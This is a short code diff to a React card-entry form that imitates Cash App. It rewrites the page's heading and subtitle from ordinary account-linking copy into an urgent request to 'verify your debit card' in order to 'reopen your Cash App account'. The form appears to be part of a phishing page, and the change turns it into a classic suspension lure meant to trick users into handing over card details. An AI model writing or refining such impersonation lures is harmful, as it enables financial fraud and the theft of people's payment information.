@@ -7,10 +7,10 @@ export default function CardForm() {
 </h1>
 
         {/* Title */}
-        <h2 className="title">Link bank using your debit card</h2>
+        <h2 className="title">Verify your debit card linked to your account.</h2>
         <p className="subtitle">
-          Linking an external account allows you to move money in and out of
-          your Cash App balance.
+Verify your debit card linked to your account.
+Complete the account information verification process to reopen your Cash App account.
         </p>
 
         {/* Form */}
